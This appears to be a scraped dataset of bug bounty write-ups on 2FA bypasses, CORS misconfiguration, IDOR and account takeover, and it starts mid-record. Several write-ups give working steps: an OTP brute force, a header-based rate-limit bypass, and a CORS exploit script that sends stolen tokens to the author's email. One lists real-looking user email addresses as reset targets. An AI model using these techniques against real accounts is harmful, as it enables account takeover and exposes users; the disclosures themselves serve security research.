a combination of 4 digits starting from 0000 to 9999. If we count there 10,000 combinations. In the age of powerful computer 10,000 combinations take only a few minutes to process. If OTP verification is not properly managed, anyone can bypass this with a simple brute force. Why I was able to bypass the 2FA? No rate limiting on an unsuccessful attempt No new OTP policy on X unsuccessful attempt Few prerequisites: Web Browser Burp Suite Now let's see how I was able to bypass the 2FA with burp suite:- Step 01: Logged into the website using the mobile number and entered the wrong OTP to intercept on burp suite Press enter or click to view image in full size Pannel to enter the OTP received on the Mobile Number Press enter or click to view image in full size Intercept the Verify OTP API call on Burp Suite Step 02: Sending the verifyOTP API call to the intruder. Press enter or click to view image in full size Image showing the Dialogue box to send intruder. Press enter or click to view image in full size Intruder Screen Burp Suite Step 03: Selecting the OTP placeholder and add it for simple brute force. Press enter or click to view image in full size Intruder screen with OTP placeholder selected for brute force Step 04: Select the Payload tab, changed the payload type to Numbers and change the payload options as desired and clicked on the attack. Press enter or click to view image in full size Payload Screen: For setting payload desired options Press enter or click to view image in full size Brute Force In Progress Step 05: As the brute force was in progress I could see length for one of the OTP value is changed from 617 to 2250. Lets check: Press enter or click to view image in full size OTP Response Step 06: Boom !!! I was able to get the login token and was able to log in. Press enter or click to view image in full size Details of successful login Hence, The simple brute force was successful. Security Devsecops -- -- 2 Published in devopsenthusiasm 23 followers · Last published Jul 17, 2020 devopsenthusiasm Written by Akash Agrawal 120 followers · 6 following A computer geek, lover of programming and learner is how I would simply define myself. To challenge myself in field in Computers and Cyber Security. Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@YumiSec/how-to-bypass-a-2fa-with-a-http-header-ce82f7927893", "title": "How to bypass a 2FA with a HTTP header | by Yumi | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@YumiSec/how-to-bypass-a-2fa-with-a-http-header-ce82f7927893. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow to bypass a 2FA with a HTTP header | by Yumi | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How to bypass a 2FA with a HTTP header Yumi 3 min read · Apr 26, 2019 -- 2 Listen Share Hi everyone and welcome back on this new write-up. Today, I would like to talk about a vulnerability I found on some programs that allowed me to bypass their 2FA protections. On a side note, due to the fact that the programs are private, all the informations about the websites will be redacted. That’s said, let’s start ! Introduction: As many hunters, when I start my research on a new bug bounty program, I use the application as a lambda user. This allow me to understand how the applications work and notice which features can be interesting to test. I noticed that the applications had a 2FA feature, I enabled it and I started to play with it. For those who are not familiar with the concept of 2FA (Two-factor authentication), this can be defined by: Two-factor authentication ( 2FA ) is a way to add additional security to your account. The first “factor” is your usual password that is standard for any account. The second “factor” is a verification code retrieved from an app on a mobile device or computer. (Wikipedia) Press enter or click to view image in full size Illustration by DoubleOctopus In a 2FA protection, the verification code is usually an integer between 4 and 6 digits. This mean that the number of combinations for each case is: 4 digits: 10⁴ → 10.000 combinations 6 digits: 10⁶ → 1.000.000 combinations In both cases, due to the low numbers of combinations, the 2FA code can be brute-forced (especially for 4 digits verification code). With those informations in mind, a 2FA should absolutely have a strong rate limit to not be easily bypassable. In the case of the applications I tested, they had a rate limit in place to avoid any kind of brute-force attack against the Two-factor authentication feature. The bypass: To be efficient, a rate limit need to be well implemented. I started to search if this limit could be bypassed. My first thought was to search on which value the rate limit was based. I tested the following parameters: User email address Session cookies Strangely, none of this parameter had an impact on the rate limit in place. After few minutes, I remembered a report by corb3nik . He was able to bypass a rate limit on Dashlane bug bounty program with the help of the X-Forwarded-For HTTP header . According to MDN Web Docs : Press enter or click to view image in full size I tested to bypass the rate limit a new time by adding a X-Forwarded-For header to the HTTP request and I was surprised by the fact that the applications accepted my request. With this issue an attacker could brute-force the Two-factor authentication by using the X-Forwarded-For header when his request will be blocked. Conclusion: A rate limit is a solid way to increase the security of your web-application. Nevertheless, they need to be well implemented to be efficient. In the case of a Two-factor authentication feature, the rate limit shouldn’t be based on an information that could be manipulated by the user via the HTTP request. I hope you enjoyed this reading ! Yumi Security Bug Bounty Infosecurity Infosec 2fa -- -- 2 Written by Yumi 255 followers · 3 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@lukeberner/how-i-abused-2fa-to-maintain-persistence-after-a-password-change-google-microsoft-instagram-7e3f455b71a1", "title": "How I abused 2FA to maintain persistence after a password change (Google, Microsoft, Instagram, Cloudflare, etc) | by Luke Berner | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@lukeberner/how-i-abused-2fa-to-maintain-persistence-after-a-password-change-google-microsoft-instagram-7e3f455b71a1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I abused 2FA to maintain persistence after a password change (Google, Microsoft, Instagram, Cloudflare, etc) | by Luke Berner | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I abused 2FA to maintain persistence after a password change (Google, Microsoft, Instagram, Cloudflare, etc) Luke Berner 5 min read · Jan 25, 2019 -- 18 Listen Share TL;DR: Waiting in the 2FA page could allow you to log in without knowing the current password in many major websites. This is a logic flaw vulnerability I initially found in Google , and then tested in other top companies (such as Microsoft, Instagram, Cloudflare, etc ) to find out they were vulnerable as well. 1) The initial bug It all started with the idea that, being 2FA newer than most login flows, it would have to be implemented by different teams at different times (in some cases, probably years apart). As any project involving multiple teams, communication is hindered and coordination can be impacted. So… what happens if you try to change something in the process, like changing your password, while being in the process of logging in, let’s say in the 2FA login page? Press enter or click to view image in full size Image 1: 2FA input page, were the Attacker waits until the password is changed (yeah, that's not my real email) So I went, changed the password (triggering all sessions to be terminated ), waited 10–15 min and then tried the 2FA code… It worked! . Having this PoC, I immediately went and reported it to Google. After some exchange of emails, they acknowledge the issue but remarked that the sessions expired after 20 min: “If you find a way to make this attack work for more than, say, two hours please let us know. This would indicate a problem in our session logic.” 2) Round two After some weeks of slowly testing different scenarios ( to be honest, I thought it was a dead-end ) I found out a way of bypassing session expiration: if you went to ‘ Try another way ’ in the 2FA input page , chose 2FA as a method again (funny, right? ) your session was renewed, and you had another 20 minutes to go. Automated this test, made a PoC, waited for +2 hours and it still worked. Press enter or click to view image in full size Image 2: Way to bypass session expiration But this was not the best part . Poking around the options available and all the possible flows, I tried all this process again but, in the middle, turned off 2FA. Being in the 2FA input page, the code should not work if 2FA is off, right? Well, wrong. The 2FA code was working even when the 2FA option was off! . This changed everything. The attack scenario just got bigger. This means that if an Attacker hijacks an account (leaks happen everyday), exploiting this vulnerability the new attack scenario would be: An Attacker enables 2FA in Victim’s account. In another browser, Attacker waits indefinitely in the 2FA input page ( Image 1 ). Attacker disables 2FA . The Victim regains access to the account (changing password & resetting sessions) Then the Attacker could input a valid 2FA code and have access again to the account, without knowing the current password. I quickly sent this new information to Google and got the confirmation of the bug: Press enter or click to view image in full size After a few weeks, the panel awarded me a nice bounty and fixed the issue :) 3) The others Some days later I thought ‘ If this happened with Google , what about other companies? ’. I went on testing in other big companies ( Facebook , Github , LinkedIn ) and this was not working: whenever the password was changed or the 2FA was disabled, the session waiting in the 2FA input page would no longer be valid. However, being Instagram one of Facebook's top acquisition, I tried it there as well and found it was vulnerable ! Sadly, they labeled it as \"theoretical attack\". Microsoft Login was vulnerable too, but didn't fix it either (more on these later). After some trial and error, I went through HackerOne/Bugcrowd directories and found many companies that were vulnerable to this attack ( Cloudflare, Algolia, some private programs, etc ). They all fixed the vulnerability and awarded me bounty/swag. 4) Not fixing Two important companies labeled this vulnerability as \"working as intended\": Microsoft and Instagram . 4.1) Microsoft Being Microsoft one of the top companies as well, and having their ‘ Microsoft Identity Bounty Program ’ released within those days (up to 100K bounty), I checked their centralized login: login.live.com . Tested Google’s exact same attack scenario and I couldn’t believe my eyes: it worked, too! Sadly, it was not a good experience as it was with Google. All the responses I received seemed to fail understanding the vulnerability reported, and closed the report as “work as intended”. After some time, I escalated through LinkedIn with someone from Security for them to re-review the report. Made them a blog post about it explaining the vulnerability and 2 PoC videos. One of their answers was \" if you are still seeing this issue post 24 hours of logout, this could potentially meet the bar.\". S ent a PoC showing this was possible, but they still would not agree to fix it. Asked if it was OK for me to publicly disclose this information and they agreed. Communications with Microsoft started 06/2017. This vulnerability still works in Microsoft Login. 4.2) Instagram As soon as I validated that this vulnerability was working in Instagram , I crafted a nice report and sent it to them. However, the vulnerability was not fixed: \" [the attack] seems unlikely to happen commonly, making this more of a theoretical attack. The protection in this case is to not allow someone to steal your password \" I tried remarking that an \" unlikely \" in a +1B users platform could mean millions of users affected by this attack, but even then was not marked as valid. Some months later, after Facebook’s security breach in 09/2018 (and posting that they would be “ decreasing the technical overhead necessary to be eligible for bug bounty ”), I re-opened the issue asking if this could be reconsidered as a valid vulnerability. However, they told me I was not the first one reporting this vulnerability, so if this vulnerability was someday marked as valid, my report would still be ineligible for a reward. Security Bug Bounty Google Microsoft -- -- 18 Written by Luke Berner 375 followers · 11 following Senior Security Engineer Responses ( 18 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://bugbountypoc.com/instagram-account-is-reactivated-without-entering-2fa/", "title": "Instagram account is reactivated without entering 2FA ($500) - Bug Bounty POC", "friendly_explanation": "This is a bug bounty writeup from https://bugbountypoc.com/instagram-account-is-reactivated-without-entering-2fa/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nInstagram account is reactivated without entering 2FA ($500) - Bug Bounty POC Bug Bounty POC Home Vulnerability Cross Site Scripting CSRF Session bug Other Guest Writeup Home Vulnerability Cross Site Scripting CSRF Session bug Other Guest Writeup Bug Bounty POC All Bug Bounty POC write ups by Security Researchers. Other 1 Instagram account is reactivated without entering 2FA ($500) by Aman Shahid · Published August 21, 2019 · Updated October 9, 2023 Description: When we have 2FA enabled on our Instagram account, let’s say I have an Instagram account with 2FA enabled. If I deactivate it for any reason, such as choosing to deactivate my Instagram account instead of deleting it to prevent others from viewing my Instagram profile or accessing its data an attacker can reactivate it using my credentials and without needing 2FA. I’ve noticed that if the 2FA-enabled Instagram account is deactivated and an attacker obtains access to its credentials, they can reactivate the account without needing the 2FA code. This is different from Facebook, where entering the 2FA code is required for reactivation. This discrepancy highlights a vulnerability, and it could potentially impact many users. 2FA is a crucial part of authentication, and an account should not be reactivated or any other action taken without requiring the 2FA code. Timline: 24 June, 2019: Triaged 18 July, 2019: Fixed 20 July, 2019: Bounty awarded $500 Twitter: https://twitter.com/amansmughal You may also like... 5 IDOR vulnerability in Hackerone March 9, 2016 by Bharat Sewani · Published March 9, 2016 · Last modified March 13, 2016 0 Non-Deletable Co-Admin Due To Change Name Functionality November 18, 2016 by bugdiscloseguys · Published November 18, 2016 · Last modified December 1, 2016 3 Open redirection in 99design March 13, 2016 by admin · Published March 13, 2016 · Last modified March 14, 2016 1 Response Comments 1 Pingbacks 0 Tanio says: December 12, 2019 at 9:16 am Hi, I deactivated my account and 2 FA doesn’t work for the login. Can you help me ? Reply Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment Name * Email * Website Previous story S3 Bucket Misconfiguration: From Basics to Pawn Recent Posts Popular Posts Recent Comments Tags Other Instagram account is reactivated without entering 2FA ($500) 21 Aug, 2019 S3 Bucket Misconfiguration / Vulnerability S3 Bucket Misconfiguration: From Basics to Pawn 3 Jan, 2019 Guest Writeup How I was able to Harvest other Vine users IP address 2 Jan, 2019 Guest Writeup Bugcrowd’s Domain & Subdomain Takeover! 18 Aug, 2017 Guest Writeup AWS S3 bucket writeable for authenticated aws users 22 Jul, 2017 Other / Vulnerability Facebook Live Application Authentication bypass 25 Mar, 2016 CSRF / Vulnerability Account Deletion CSRF vulnerability in hired 25 Mar, 2016 Other / Vulnerability User agent spoofing in email notification 2 Apr, 2016 Guest Writeup Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net 8 Jul, 2017 Guest Writeup Bugcrowd’s Domain & Subdomain Takeover! 18 Aug, 2017 Tanio says: Hi, I deactivated my account and 2 FA doesn’t work for... SHADOW says: Its Really awesome bro,can u plz post about different encoding techniques CORS攻击案例 – penenote says: […] Exploiting Misconfigured CORS (Cross Origin Resource Sharing) Exploiting Insecure Cross... Abhishek says: Can you make video on it so I better understand about... Pranob Nath says: Wow... nice finding But i have a question there's no CSRF... 99design Account Deletion CSRF vuln in hired Account Takeover Account Takeover through Password Reset Auth bypass in Facebook Aquired Parse Badoo Account takeover Bug Bounty Bug bounty POC BugBountyPoc Business Logic Flaw Business Logic Flaw in Facebook Coinbase Cross Site Scripting Cross Site Scripting in Hostinger CSRF CSRF Vulnerability in Oculus Facebook Facebook aquired parse Facebook bug bounty Facebook Live Application Authentication bypass google bug guest post Guest writeup Hackerone HackerRank Hired Hostinger IDOR IDOR vulnerability in hackerone Oculus Open redirection in 99design Parse Phone Number Verification Bypass Phone Number Verification Bypass in Twitter Price Manipulation Price Manipulation on OpenDrive private website Remote Code Execution in private website Session Bug Session Issue Session issue in Coinbase Stored XSS Twitter Verification bypass XSS More Recent Posts Instagram account is reactivated without entering 2FA ($500) S3 Bucket Misconfiguration: From Basics to Pawn How I was able to Harvest other Vine users IP address Bugcrowd’s Domain & Subdomain Takeover! AWS S3 bucket writeable for authenticated aws users Bug Bounty POC © 2025. All Rights Reserved. Powered by - Designed with the Hueman theme"}
{"source_url": "https://medium.com/@goyalvartul/how-i-hacked-40-000-user-accounts-of-microsoft-using-2fa-bypass-outlook-live-com-13258785ec2f", "title": "How I hacked 40,000 user accounts of Microsoft using 2FA bypass(outlook.live.com). | by vartul goyal | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@goyalvartul/how-i-hacked-40-000-user-accounts-of-microsoft-using-2fa-bypass-outlook-live-com-13258785ec2f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I hacked 40,000 user accounts of Microsoft using 2FA bypass(outlook.live.com). | by vartul goyal | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I hacked 40,000 user accounts of Microsoft using 2FA bypass(outlook.live.com). vartul goyal 4 min read · Feb 5, 2019 -- 4 Listen Share Web.archive.org is my favourite tool and so I thought to choose outlook.live.com to make my target component. Microsoft Outlook is a personal information manager from Microsoft , available as a part of the Microsoft Office suite. Although often used mainly as an email application, it also includes a calendar , task manager , contact manager , note taking , journal , and web browsing. It can be used as a stand-alone application , or can work with Microsoft Exchange Server and Microsoft SharePoint Server for multiple users in an organization, such as shared mailboxes and calendars, Exchange public folders, SharePoint lists, and meeting schedules. Microsoft has also released mobile applications for most mobile platforms, including iOS and Android. Developers can also create their own custom software that works with Outlook and Office components using Microsoft Visual Studio . In addition, Windows Phone devices can synchronise almost all Outlook data to Outlook Mobile . This is more secured platform used by million of users on daily basis at corporate and personal use level. When I was searching for archived directories in web.archive.org, it suddenly strikes with some common parameter like below: /owa/username @hotmail.com/ and then my second step is to check that whether these username are expired one or active users, when put the first username, it gives me link that username is valid and redirected to password page. I tried many attempts to reset the password but no success. Then I tried one last option “I do not have any of these”. Afterwards you will redirected to next page where it will ask you to send the authentication code in any mail id. Now you have valid Microsoft username and your valid email id to receive the authentication code. At last I got the below authentication code: Microsoft account Password reset code: Please use this code to reset the password for the Microsoft account go*****@gmail.com . Here is your code: 0470572 If you don’t recognise the Microsoft account go*****@gmail.com , you can click here to remove your email address from that account. Thanks, The Microsoft account team I simply put the authentication code and redirected to security question where I need to answer very basic question, this is below screenshot and half of the information, you can get from username and other from social engineering. Press enter or click to view image in full size One can easily bypass these scenarios and I found more than 40,000 active users through waybackurls utility when I asked the Microsoft security team to reset the password for any active users, hence they did not allow me to do so and created their test accounts to allow me to reset their passwords. This is very basic security questionnaire, if you can compare with Google account recovery page, as they have put it over there and one can easily bypass it. When I asked to Microsoft security team that this is high critical bug and impacted large number of Microsoft users and simply ignored. This is below reply got from Microsoft. Microsoft Reply: Hello Vartul As stated earlier, these are not password reset codes, but just the codes to check if the email provided is valid. These cannot be used to reset password. Also, once the email has been confirmed, an attacker needs to provide verification information about the account for resetting password. That information is then verified. The attack mentioned in the report is not a security bypass. Please let me know if you have more questions. We have closed the case. Thanks MSRC Reproducing Steps: Go to below URLs and pick all emails and collect it one tex file. 2. Collect it all emails which contains all emails after /owa/ evangelinedobney@hotmail.com/ in this pattern. 3. All URL’s, I have collected from web.archive.org . 4. Let collect the six emails and try to exploit it. evangelinedobney@hotmail.com — → can reset the password for this account. evanieves269@msn.com — — → can reset the password for this account also. evaserio@hotmail.it — — — ->can reset the password for this account also. evuong@hotmail.com — — →can reset the password fo this account also. explicitsoundz@hotmail.com — →can reset the password fo this account also. fernandosoares121253@hotmail.com — ->last one access code I received and can reset the password for it. 5. I got the 6 mails and let try to show in video how to exploit it. I will take email id one by one. 6. Go to https://outlook.live.com , lets make the video. 7. From video, it has been clearly shown that I can able to reset the password for any user mail mentioned in below mails. here is below video link for more description: https://www.youtube.com/watch?v=mzxX1h9sG9Y Security Informationsecurity Hacking Penetration Testing Webapplicationsecurity -- -- 4 Written by vartul goyal 48 followers · 5 following Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://bugreader.com/rony@disclosing-privately-shared-gaming-clips-of-any-user-128", "title": "404 Not Found", "friendly_explanation": "This is a bug bounty writeup from https://bugreader.com/rony@disclosing-privately-shared-gaming-clips-of-any-user-128. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404 Not Found 404 Sorry, page was not found The page you are looking for isn't available right now or not exist. Homepage"}
{"source_url": "https://bugreader.com/rony@page-analyst-could-view-job-application-details-213", "title": "404 Not Found", "friendly_explanation": "This is a bug bounty writeup from https://bugreader.com/rony@page-analyst-could-view-job-application-details-213. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404 Not Found 404 Sorry, page was not found The page you are looking for isn't available right now or not exist. Homepage"}
{"source_url": "https://medium.com/@zk34911/facebook-bug-bounty-how-i-was-able-to-enumerate-instagram-accounts-who-had-enabled-2fa-two-step-fddba9e9741c", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@zk34911/facebook-bug-bounty-how-i-was-able-to-enumerate-instagram-accounts-who-had-enabled-2fa-two-step-fddba9e9741c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 User deactivated or deleted their account."}
{"source_url": "https://medium.com/@mashoud1122/cors-misconfiguration-account-takeover-out-of-scope-to-grab-items-in-scope-66d9d18c7a46", "title": "CORS Misconfiguration to Account TakeOver [Out of scope to grab items In-Scope] | by Mashoud1122 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@mashoud1122/cors-misconfiguration-account-takeover-out-of-scope-to-grab-items-in-scope-66d9d18c7a46. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCORS Misconfiguration to Account TakeOver [Out of scope to grab items In-Scope] | by Mashoud1122 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in CORS Misconfiguration to Account TakeOver [Out of scope to grab items In-Scope] Mashoud1122 5 min read · Nov 24, 2019 -- 2 Listen Share Hi, i’m Mashoud . This is my first write up. And i hope you are able to learn from it I was working on a private program for a few hours. I had found 2 bugs that i put aside to try and chain it with something to create a report of good severity. Private Program URL = host.com 1st Bug. Open Redirect -> Reflected XSS [No data could be stolen] www.host.com/redencrypt?location=data:text/html%3Bbase64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg==&utm_source=saloncentric_app&utm_medium=referral This only worked on Safari so it was not so useful Vulnerable Parameter: location payload: data:text/html%3Bbase64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg == base64 decode: <script>alert(‘test3’)</script> 2nd Bug Session not invalidated after logout or changing Account Password To anyone who does not understand , This is when a session is captured and does not get expired or deleted after logout or even after changing the accounts password in my case. This can be found be simply by sending a request of an active session to burp suites Repeater Log Out or Change Account Password in Browser Replay the session in the repeater to see if it still shows User Data If it does, 🤑🤑🤑. Else: ☹️ JWT sessions work with time. So this is not likely when the host is using JWT tokens 3rd Bug CORS misconfiguration to steal victims sharing codes and eMail address On the platform, users can share discount codes, invites codes, etc. to the friends via a share function , which takes an input of their friends email (the receiver email). The receiver is also able to see the senders main account eMail in the mail he/she received. The issue here was/is, the only thing in scope till now is: host.com and this was found sub1.host.com That subdomain handled sending the codes Because of the CORS configuration on that domain, I was able to send[POST] data to it with the users cookies/credentials. This was fair enough for me because, i could make it send the codes to my eMail. This allowed me to steal the victims codes and the victims eMail after receiving the mail as i said earlier. Code on my evil web page: <script> function steal(){ var xmlH = new XMLHttpRequest(); xmlH.open(\"GET\", \"https://sub1.host.com/api/v4/mail-token\", true); xmlH.withCredentials = true; xmlH.send(); xmlH.onload = function(){ data = JSON.parse(this.responseText); var mail_token = data.mail_token; var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"https://sub1.host.com/api/v5/email/share-code\", true); xhr.setRequestHeader(\"MailToken\", mail_token); xhr.setRequestHeader(\"Content-Type\", \"application/json\"); xhr.send('{\"target\":\"id:222920\"},\"recipient_emails\":[\"mashoud1122@wearehackerone.com\"],\"message\":\"STOLEN WITHOUT NOTICE/Interaction + EMAIL OF VICTIM in TITLE\"}'); } } </script> <body onload=\"steal()\"></body> This script stole the temporal mail token , then makes a post request to the sharing endpoint with the mail token in the header for authorization, then sends codes and email to my eMail 4th Bug A simple Logical Bug This is not really a bug on its own. But these are things i always look for that upgrade my reports seveirty. sub2.host.com — vulnerable due to CORS misconfiguration Found sub2.host.com/api/v2/token this endpoint showed me a string. I tried those characters in many places randomly. Until I noticed it can also be used to authenticate an api host: mydata.host.com Putting that string into the Authorization header or in a cookie called “ ac_access_token ” on that host will give an authenticated api response of the users account. After fuzzing that host I noticed the api shows the following on different paths: Users purchases All the eMails the victim has shared anything at all with [MetaData] Victims account details [email, fullName, Number, etc] Rewards that the user currently has Creating the Final Bug Now, we already have a good bug. Since the other domain has a CORS misconfiguration [Meaning account takeover already]. But i just needed to make this bug cool. So i used each of the bugs to get an account take Over. The tokens from sub2.host.com/api/v2/token get changed on that page any time the user logs out or changes their password. So here is what i did. Open Redirect -> Attacking Site ->Attacking site abuses CORS Misconfig on sub1.host.com to receive victims email in my email with invite or discount code; I also replaced the message in the email. Message was the token stolen from sub2.host.com/api/v2/token -> Authenticate the api as the user with the stolen tokens received in our eMail::: And remember BUG 2??>> Sessions never got expired no matter what :) Api endpoints: /user-me— account details (email, Full Name,profile pic, lang, and some few other stuff) /user-me/purchases — Account Purchases[order Number, tracking, basic details that show on an order] /user-me/sharables — Every eMail the account has sent a code to.With the codes and the email batch that i can use to replicate the email ;) /user-me/rewards — Reward codes and other form of rewards given to users who actively purchase Press enter or click to view image in full size Abusing all the bugs to make their own site send me the codes ;) mydata.host.com — aleternate api to handle user data Now all i did was curl https://mydata.host.com/api/v4/user-me/purchases --cookie \" ac_access_token =STOLEN_TOKENS\" | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2 100 2 0 0 10 0 --:--:-- --:--:-- --:--:-- 10 [🤑🤑🤑🤑🤑🤑] curl https:// mydata.host.co m/api/v4 /user-me/ --cookie \" ac_access_token =STOLEN_TOKENS\" | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 311 100 311 0 0 2046 0 --:--:-- --:--:-- --:--:-- 2046 { \"id\": \"6747556293635101522\", \"email\": \"mashoud1122+test@not-wearehackerons-email\", \"first_name\": \"Mashoud\", \"last_name\": \"Acc2\", \"profile_picture_url\": null, \"lang\": \"en-US,en;q=0.5\" } Press enter or click to view image in full size Once you have this, it would work till ……. Nothing on the host expired after log out or password change. This was a private program. I had to modify a lot of stuff in this post.I also did not add the final script because, if i made a mistake in the editing the enpoints or domains, you might get confused. And i also feel like this host could be found if i had used the real endpoints :( . Sorry. But i hope everything added up to give you some extra techniques Security wise, i think the programs structure was just misconfigured. The team took the severity into consideration and accepted the bug. Reward: $1,500 on hackerone.com Press enter or click to view image in full size https://twitter.com/Mashoud1122 Bug Bounty API Information Security Infosec -- -- 2 Written by Mashoud1122 82 followers · 4 following twitter.com/Mashoud1122 — hackerone.com/Mashoud1122 Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.bi.tk/chrome-cors/", "title": "Untitled", "friendly_explanation": "This is a bug bounty writeup from https://blog.bi.tk/chrome-cors/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBad Gateway"}
{"source_url": "https://bugreader.com/jubabaghdad@disclose-private-dashboard-charts-name-and-data-in-facebook-analytics-184", "title": "Disclose Private Dashboard Chart's name and data in Facebook Analytics | Bugreader", "friendly_explanation": "This is a bug bounty writeup from https://bugreader.com/jubabaghdad@disclose-private-dashboard-charts-name-and-data-in-facebook-analytics-184. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDisclose Private Dashboard Chart's name and data in Facebook Analytics | Bugreader Bugreader Reports Home Reports Social Researchers Login Register Sarmad Hassan Published On: 07 May 2020 Disclose Private Dashboard Chart's name and data in Facebook Analytics IDOR Facebook | Web --- LOW VALID In Facebook Analytics, you can create custom dashboards, which you can view from Dashboards. Use custom dashboards to create a customized view, or to see the information that matters to you most in one place. you can also set \"its visibility\" by checking on \"Private\" option check mark, which mean only the owner of this dashboard can see it and its contents. Description It is possible to disclose \"Chart name and its Data\" for a private dashboard (by any user who have role on the entity or page like analyst role\" using an IDOR bug in the parameter called \"chartID\". Impact Page analyst could view analytics charts where the page admin had set the visibility to \"owner only\". Reproduction Steps Step 1 POST /graphql?locale=user HTTP/1.1 Host: graph.facebook.com access_token=Analyst_ACCESS_TOKEN&fb_api_req_friendly_name=AnalyticsChartDeleteMutation&variables={\"chartID\":\" admin private chart ID \"}&doc_id=1297068037067230 Response: {\"data\":{\"node\":{\"__typename\":\"AnalyticsStoredAggregationChart\",\"chartId\":\" admin private chart ID \",\"chartType\":\"BREAKDOWN_TABLE\",\"chartQueries\":[{\"__typename\":\"AnalyticsAggregationQuerySpec\",\"aggregationMetric\":\"UNIQUE_USERS\",\"aggregationMetricParams\":[],\"aggregationPeriod\":\"RANGE\",\"breakdowns\":[\"$fb.age\"],\"dateRange\":{\" type\":\"LAST_28_DAYS \",\"since_iso_date\":null,\"until_iso_date\":null},\"displayName\":null,\"eventName\":\"fb_pages_post_reaction\",\"orderingColumns\":[],\"orderingType\":\"DESCENDING\",\"limit\":0,\"segment\":{\"__typename\":\"AnalyticsAdhocFilterSetListing\",\"name\":null,\"serializedFilter\":\"{\\\"event_rules\\\":[],\\\"demographic_rules\\\":[],\\\"device_rules\\\":[],\\\"percentile_rules\\\":[],\\\"user_property_rules\\\":[],\\\"web_param_rules\\\":[]}\",\"filter_json\":\"{}\"},\"tag\":\"CHART\"}],\"description\":\"\", \"title\" :\" private chart name \",\"segmentBehavior\":\"USE_LOCAL\",\"chartAnnotations\":[],\"errorBounds\":[],\"goal\":null,\"id\":\"id\"}},\"extensions\":{\"is_final\":true}} My Notes * When it comes to logical bugs like IDOR, always check for Sub-options, because sometimes developers protect only the main option and forget about Sub-option just like in our case here where \"Chart info\" was the sub-option of the main option \"Dashboard\" Videos Timeline Sarmad 17 Feb 2020 Initial Report Facebook 26 Feb 2020 Report Triaged Facebook 08 Mar 2020 Report Fixed Sarmad 08 Mar 2020 Fixed Confirmed Facebook 02 Apr 2020 Bounty awarded VALID General Info Introduction Description Impact Steps Step 1 Other Info My Notes Videos Timeline Initial Re ... Report Tri ... Report Fix ... Fixed Conf ... Bounty awa ... Show All Images ×"}
{"source_url": "https://bugreader.com/binit@adding-anyone-including-non-friend-and-blocked-people-as-co-host-in-personal-event-181", "title": "Adding anyone including non-friend and blocked people as co-host in personal event! | Bugreader", "friendly_explanation": "This is a bug bounty writeup from https://bugreader.com/binit@adding-anyone-including-non-friend-and-blocked-people-as-co-host-in-personal-event-181. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAdding anyone including non-friend and blocked people as co-host in personal event! | Bugreader Bugreader Reports Home Reports Social Researchers Login Register Binit Ghimire Published On: 02 May 2020 $ 750 Adding anyone including non-friend and blocked people as co-host in personal event! IDOR Facebook | Web Inclusion in the 2019 Thanks page MEDIUM VALID This IDOR vulnerability in the Facebook Events platform allowed an attacker profile to add anyone as co-host in his/her personal event including non-friends, non-friends-of-friends and people who have blocked him/her. Description When you are creating an event from your personal profile on Facebook, Facebook would ask you to select friends who you want to add as co-hosts for the event. For this vulnerability to be reproduced, you would have to select a friend as co-host and while submitting the request to Facebook, you would have to replace his/her profile ID with the profile ID of someone who is neither your friend, nor any of your friends-of-friends (i.e. either non-friends-of-friends or blocked people). Impact Taking an advantage of this vulnerability, an attacker would be able to add anyone including non-friends-of-friends and blocked people (people he/she has blocked and people who have blocked him/her) as co-host in his/her personal event on Facebook. Reproduction Steps Step 1 Login to User A's account on the web version of Facebook, and then visit https://www.facebook.com/events/ Step 2 Click on \" Create Event \" and select any of the options among private and public events. Step 3 Select User A in Event Host drop-down list (if User A has pages, it will show drop-down list, otherwise it will show User A only, so in such case, no need to worry about selecting User A as it is selected by default). Step 4 Fill up all the fields in any way you want, and in Co-hosts field, enter \" User B \" and select User B . Step 5 Before clicking on the \" Create \" button, start intercepting on BurpSuite or OWASP ZAP or any other similar tools. Step 6 Click on the \" Create \" button, and keep forwarding all the requests until you see a request which looks like this: POST 